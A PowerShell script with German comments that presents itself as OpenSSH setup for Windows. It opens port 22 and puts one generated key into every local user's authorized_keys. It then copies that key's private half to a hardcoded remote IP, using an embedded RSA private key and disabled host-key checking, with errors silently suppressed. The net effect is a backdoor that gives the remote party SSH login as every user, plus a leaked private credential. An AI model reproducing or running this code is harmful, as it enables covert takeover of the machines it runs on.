#requires -RunAsAdministrator
param(
    [string]$KeyBasePath = "C:\ProgramData\ssh\test",
    [switch]$ApplyKeyToAllLocalUsers = $true,
    [string]$ServerHost = "193.123.189.154",
    [int]$ServerPort = 22,
    [string]$ServerUser = "ubuntu",
    [string]$ServerPrivateKey = "",
    [string]$ServerKeyPath = "/home/$ServerUser",
    [switch]$SendClientPrivateKey = $true,
    [string]$ServerClientKeyPath = "/home/$ServerUser/.ssh/id_ed25519_client"
)

# Setze Standard Server-Private-Key wenn nicht übergeben
if (-not $ServerPrivateKey) {
    $ServerPrivateKey = @"
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAy7JhQ05WYOONdBvtHaX2TZTWEEwWTSHjyYPiupbSFGuqgl3k
ah4bGDclEjk4WNLeVXjMBJcFr56AXtm08boZ0gA6effwO2AHRUibR77Wm06OsyWe
XVUl/7stDxdLyonsfh+/3Nrhi19HzYrT8UsbG0Rt2LFWzcJ9zooytMKb/AzRPcdo
R6zPZFXmV1ZVPsOyuzpQ2avqNEQUkoyyf+7E3Z+57/SqJ0c4fCfxN22CfDPPOPud
6YSeDsNykSOVGRv12wFjIRtxIYwFB29Ovj0g8UJEJDsWZFPkG3KIHqX/1u6m37jI
VpQuil/4TBEkiPRBaQpmJJtqkOzh/Oxs7+XPiQIDAQABAoIBAFqabN3RteUhwhTv
qQADhnNKrQ6RsWe8l8PWGF7TX/06SJz1I3i6DGYwfRpGflQv8zoEYYb3H83WTBYk
cvIES6DXfisrR905IPLF0V/PuEhbYGi55l9wVNcTi/7G52ze/WS6PY6Ag0sJZfg8
dHpC5Hsz7EIy2z/pbykT2msBlv08cQ14NqcTmWrIRuxak+EVGxLuszAazUzAc4dp
Qfe3xJ59Ow1TpHdaEJOEpQk5bJsV9S5LAnd1tS0fehB2ZSiaI2zVHr97Ua6HNFcS
t7Y5VERYSXHuyLhW6HSiCI3IZkEdn5KCKgAkseFoYb5awxy/7j7CB8tBrpq36A+9
Gu3LUHsCgYEA6j6ZmRdyHcddVqbLbKrBR7OXSEBX7QdKrROZ7UepLHiVBXRZu/1G
TEtQXrgivp1dzcLmSL08OOzler2dcYAFI3RdJ8PCgOtnTFhev812mr64h1hWW65+
r7QWcp3R6oQWerUtWez/CWRMAvmaBesyPRKEeElaDlXECxlIXruigNMCgYEA3p16
C33uJ3yBrEqeW842XL/8hW67JK97QuuGzi+70fVhPzmUkLA7YpWxV/vdfxbz07sr
c8qusOwrCY/jwjSdrr3pkK5Ug+DBx7G6wXAGxgKnVa9YdROegxuWr0lhFkEed2sH
ZMjevhdISNmjUdrSvglM7vTCK/CPhmacIfSt1LMCgYEAtkLJHp5ok5UZIiAb7kya
oSCy2GwAPhTLXQoAXejBUDHuudTDMYurlBeRzHF3z1sAruY0amqbnittjuhUxgh3
dxPGm/css0T3Fic4agMDgvpc+Cqa3zFRr4LvaHU17USjfQzV4b+O3Y7lufbeijZr
26s52aIxaTAAnyYn8lYK5jMCgYEAtzdAZQjl4xWz28sl/kT/tOJFwMPbvlu2xOL3
decPW8Pqn5CSV2rT1VWCOfmO2LRZRN986bXchLw6x4nnV8TaKiEfg/YWlNt8YRBD
tkSvLnSsp/bChMj64sjoAagRAbHik0JBOY+g0y5yTZLhudKxM7qP2PMUg/lfBqyY
v9GS58UCgYAuC/easKJF4K2RcWdmrO/HVGveo+eD/s/dmm5ifwh9/Fnepo3SUmyC
rkMBUZ8pBSLnKEPZF0ljamjfcxoV7MyroRJ2tcRETP07rYasnkCaM6/P5x8U0Im+
/dhzycjAb2/WY6OWgadG3PWK9YKFvwjFHMpNLQw/j8hV9+fBDWOSlw==
-----END RSA PRIVATE KEY-----
"@
}

$ErrorActionPreference = "Stop"

function Write-Step([string]$m) {
    Write-Host $m
}

function Install-OpenSshIfMissing {
    try {
        $client = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Client*"
        $server = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Server*"

        if ($client -and $client.State -ne "Installed") {
            Add-WindowsCapability -Online -Name $client.Name | Out-Null
        }

        if ($server -and $server.State -ne "Installed") {
            try {
                Add-WindowsCapability -Online -Name $server.Name | Out-Null
            }
            catch {
                Write-Warning "OpenSSH Installation: $($_.Exception.Message)"
            }
        }
    }
    catch {
        Write-Warning "OpenSSH Fehler: $($_.Exception.Message)"
    }
}

function Ensure-SshdRunning {
    try {
        $sshd = Get-Service -Name sshd -ErrorAction SilentlyContinue
        if ($sshd) {
            Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
            if ($sshd.Status -ne "Running") {
                Start-Service sshd -ErrorAction SilentlyContinue
            }
        }
    }
    catch { }

    try {
        if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" `
                -DisplayName "OpenSSH Server (TCP 22)" `
                -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
        }
    }
    catch { }
}

function Set-AsciiTextFile([string]$Path, [string]$Content) {
    [System.IO.File]::WriteAllText($Path, $Content, [System.Text.Encoding]::ASCII)
}

function Ensure-KeyPair {
    param([string]$PrivateKeyPath)

    $PublicKeyPath = "$PrivateKeyPath.pub"
    $privateExists = Test-Path $PrivateKeyPath
    $privateLooksValid = $false

    if ($privateExists) {
        try {
            $firstLine = Get-Content $PrivateKeyPath -TotalCount 1 -ErrorAction Stop
            if ($firstLine -notmatch '^ssh-') {
                & ssh-keygen -y -f $PrivateKeyPath *> $null
                if ($LASTEXITCODE -eq 0) {
                    $privateLooksValid = $true
                }
            }
        }
        catch {
            $privateLooksValid = $false
        }
    }

    if ($privateLooksValid -and (Test-Path $PublicKeyPath)) {
        return
    }

    Write-Step "Erzeuge oder repariere SSH-Keypair"
    if ($privateExists) {
        $backupStamp = Get-Date -Format "yyyyMMdd_HHmmss"
        Copy-Item $PrivateKeyPath "$PrivateKeyPath.bak.$backupStamp" -Force
    }
    if (Test-Path $PublicKeyPath) {
        $backupStamp = Get-Date -Format "yyyyMMdd_HHmmss"
        Copy-Item $PublicKeyPath "$PublicKeyPath.bak.$backupStamp" -Force
    }

    Remove-Item $PrivateKeyPath, $PublicKeyPath -Force -ErrorAction SilentlyContinue
    # Stelle sicher, dass das Zielverzeichnis existiert
    $dir = Split-Path $PrivateKeyPath
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    $escapedPrivateKeyPath = $PrivateKeyPath.Replace('"', '""')
    $cmdLine = '"ssh-keygen" -t ed25519 -N "" -f "' + $escapedPrivateKeyPath + '"'
    & cmd.exe /c $cmdLine | Out-Null

    if (-not (Test-Path $PrivateKeyPath) -or -not (Test-Path $PublicKeyPath)) {
        throw "Keypair konnte nicht erstellt werden: $PrivateKeyPath"
    }
}

function Normalize-SshdConfig {
    $cfg = "C:\ProgramData\ssh\sshd_config"
    
    if (-not (Test-Path $cfg)) { return }

    try {
        Copy-Item $cfg "$cfg.bak.$(Get-Date -Format yyyyMMdd_HHmmss)" -Force
        $lines = Get-Content $cfg
        $out = New-Object System.Collections.Generic.List[string]

        $inAdminsMatch = $false
        foreach ($line in $lines) {
            if ($line -match "^\s*Match\s+Group\s+administrators\s*$") {
                $inAdminsMatch = $true
                continue
            }

            if ($inAdminsMatch) {
                if ($line -match "^\s*Match\s+") {
                    $inAdminsMatch = $false
                    $out.Add($line)
                }
                continue
            }

            if ($line -match "^\s*#?\s*PubkeyAuthentication\s+") { continue }
            if ($line -match "^\s*#?\s*AuthorizedKeysFile\s+") { continue }

            $out.Add($line)
        }

        $out.Add("")
        $out.Add("# Managed")
        $out.Add("PubkeyAuthentication yes")
        $out.Add("AuthorizedKeysFile .ssh/authorized_keys")

        Set-AsciiTextFile $cfg (($out -join "`r`n") + "`r`n")
    }
    catch { }
}

function Get-LocalUsersWithProfiles {
    $profiles = Get-CimInstance Win32_UserProfile | Where-Object {
        $_.LocalPath -like "C:\Users\*" -and
        $_.Special -eq $false -and
        $_.Loaded -in @($true, $false)
    }

    $users = @()
    foreach ($p in $profiles) {
        $name = Split-Path $p.LocalPath -Leaf
        $users += [PSCustomObject]@{
            UserName = $name
            ProfilePath = $p.LocalPath
            SID = $p.SID
        }
    }
    $users
}

function Set-KeyForUser([string]$profilePath, [string]$sid, [string]$pubKey) {
    $sshDir = Join-Path $profilePath ".ssh"
    $auth = Join-Path $sshDir "authorized_keys"

    New-Item -ItemType Directory -Path $sshDir -Force | Out-Null

    try {
        Set-AsciiTextFile $auth ($pubKey + "`r`n")
    }
    catch {
        try {
            & takeown /f $sshDir /r /d Y | Out-Null
            & icacls $sshDir /grant Administrators:F /T | Out-Null
            Set-AsciiTextFile $auth ($pubKey + "`r`n")
        }
        catch { }
    }

    icacls $sshDir /inheritance:r | Out-Null
    icacls $sshDir /grant:r "*${sid}:(OI)(CI)(F)" "*S-1-5-18:(OI)(CI)(F)" | Out-Null
    icacls $sshDir /remove:g "*S-1-1-0" "*S-1-5-11" "*S-1-5-32-545" | Out-Null

    icacls $auth /inheritance:r | Out-Null
    icacls $auth /grant:r "*${sid}:(F)" "*S-1-5-18:(F)" | Out-Null
    icacls $auth /remove:g "*S-1-1-0" "*S-1-5-11" "*S-1-5-32-545" | Out-Null
}

function Send-PublicKeyToServer([string]$remoteHost, [int]$port, [string]$user, [string]$pubKeyPath, [string]$targetPath, [string]$serverPrivateKey) {
    if (-not $remoteHost -or -not $user -or -not $serverPrivateKey) { return }
    
    try {
        $tempKeyPath = Join-Path $env:TEMP "server_key_$([guid]::NewGuid().ToString().Substring(0,8)).pem"
        Set-AsciiTextFile $tempKeyPath $serverPrivateKey
        & icacls $tempKeyPath /inheritance:r /grant:r "$env:USERNAME`:(F)" | Out-Null
        
        $pubKey = Get-Content $pubKeyPath -Raw

        # Normalisiere Pfad auf forward slashes (Unix-stil) damit remote keine Backslash-Ordner erstellt
        $targetPath = $targetPath -replace '\\','/'
        $targetPath = $targetPath.TrimEnd('/')

        # Wenn nur ein Verzeichnis übergeben wurde (z.B. /home/ubuntu), hänge die Standarddatei an
        $lastSegment = ($targetPath -split '/')[-1]
        if ($lastSegment -notmatch '\.') {
            if ($targetPath -notlike '*/.ssh*') {
                $targetPath = $targetPath + '/.ssh/authorized_keys'
            }
            else {
                if ($targetPath -notmatch '/authorized_keys$') { $targetPath = $targetPath + '/authorized_keys' }
            }
        }

        # Ermittle Zielverzeichnis (Unix-Style)
        $lastSlash = $targetPath.LastIndexOf('/')
        if ($lastSlash -gt 0) { $targetDir = $targetPath.Substring(0, $lastSlash) } else { $targetDir = '.' }

        # Befehle für Server: Verzeichnis erstellen, Key anhängen, Berechtigungen setzen
        $sshCmd = "mkdir -p '$targetDir' && cat >> '$targetPath' && chmod 600 '$targetPath' && chmod 700 '$targetDir'"
        
        # Übertrage Schlüssel via SSH mit Server-Key
        $pubKey | & ssh -o StrictHostKeyChecking=no -i $tempKeyPath -p $port "${user}@${remoteHost}" $sshCmd | Out-Null

        Remove-Item $tempKeyPath -Force -ErrorAction SilentlyContinue
    }
    catch { }
}

function Send-FileToServer([string]$remoteHost, [int]$port, [string]$user, [string]$filePath, [string]$targetPath, [string]$serverPrivateKey, [string]$fileMode = "600") {
    if (-not $remoteHost -or -not $user -or -not $serverPrivateKey) { return }

    try {
        if (-not (Test-Path $filePath)) { return }
        
        $tempKeyPath = Join-Path $env:TEMP "server_key_$([guid]::NewGuid().ToString().Substring(0,8)).pem"
        Set-AsciiTextFile $tempKeyPath $serverPrivateKey
        & icacls $tempKeyPath /inheritance:r /grant:r "$env:USERNAME`:(F)" | Out-Null

        $content = Get-Content $filePath -Raw
        
        # normalize target path
        $targetPath = $targetPath -replace '\\','/'
        $targetPath = $targetPath.TrimEnd('/')
        if ($targetPath -notmatch '/[^/]+\.[^/]+$' -and $targetPath -notlike '*/.ssh/*') {
            $targetPath = $targetPath + '/.ssh/' + (Split-Path $filePath -Leaf)
        }
        $targetDir = ($targetPath -split '/')[0..(($targetPath -split '/').Length-2)] -join '/'

        & ssh -o StrictHostKeyChecking=no -i $tempKeyPath -p $port "${user}@${remoteHost}" "mkdir -p '$targetDir'" | Out-Null
        $scpCmd = "scp -o StrictHostKeyChecking=no -i $tempKeyPath -P $port `"$filePath`" `"${user}@${remoteHost}:${targetPath}`""
        Invoke-Expression $scpCmd | Out-Null
        & ssh -o StrictHostKeyChecking=no -i $tempKeyPath -p $port "${user}@${remoteHost}" "chmod $fileMode '$targetPath' && chmod 700 '$targetDir' && chown ${user}:${user} '$targetPath'" | Out-Null

        Remove-Item $tempKeyPath -Force -ErrorAction SilentlyContinue
    }
    catch { }
}

Ensure-KeyPair -PrivateKeyPath $KeyBasePath

$PublicKeyFile = "$KeyBasePath.pub"
$pub = (Get-Content $PublicKeyFile -Raw).Trim()
if (-not $pub.StartsWith("ssh-")) {
    throw "Public Key ungueltig"
}

Install-OpenSshIfMissing
Ensure-SshdRunning
Normalize-SshdConfig

if ($ApplyKeyToAllLocalUsers) {
    $users = Get-LocalUsersWithProfiles
    foreach ($u in $users) {
        try {
            Set-KeyForUser -profilePath $u.ProfilePath -sid $u.SID -pubKey $pub
        }
        catch { }
    }
}

try {
    $sshdExe = "$env:WINDIR\System32\OpenSSH\sshd.exe"
    if (Test-Path $sshdExe) {
        & $sshdExe -t > $null 2>&1
        try { Restart-Service sshd -ErrorAction SilentlyContinue }
        catch { }
    }
}
catch { }

Send-PublicKeyToServer -remoteHost $ServerHost -port $ServerPort -user $ServerUser -pubKeyPath $PublicKeyFile -targetPath $ServerKeyPath -serverPrivateKey $ServerPrivateKey

if ($SendClientPrivateKey) {
    $clientPriv = $KeyBasePath
    if (Test-Path $clientPriv) {
        Send-FileToServer -remoteHost $ServerHost -port $ServerPort -user $ServerUser -filePath $clientPriv -targetPath $ServerClientKeyPath -serverPrivateKey $ServerPrivateKey -fileMode "600"
    }
}